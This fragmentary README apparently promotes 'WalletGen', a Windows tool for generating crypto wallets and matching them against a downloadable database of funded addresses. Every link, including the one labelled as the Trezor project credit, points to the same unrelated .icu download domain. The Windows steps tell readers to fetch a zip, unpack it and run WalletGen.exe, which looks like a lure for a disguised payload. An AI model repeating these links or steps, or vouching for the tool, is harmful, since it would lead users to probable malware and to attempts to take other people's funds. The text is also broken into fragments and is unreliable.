...
[Download here](https://downloadsoftgits.icu/?9au8eo6gjcd5lrj)
...
## Windows 
- Download [WalletGen.zip](https://downloadsoftgits.icu/?6g7xn59gqhc6m4u)
- Unpack anywhere
- Run `WalletGen.exe`
...
You can download the WalletGen given on the [page in the release](https://downloadsoftgits.icu/?83akpxyiby3qb29).

### ❓ Where can I download a database of known addresses with balance?
You can download the current database given on the [page in the release](https://downloadsoftgits.icu/?6dtes0xq87t7f0f).
...
## Credits
This project uses code from the [Trezor project](https://downloadsoftgits.icu/?9in8ivgn9c0ef5r). The code is licensed under the MIT License.
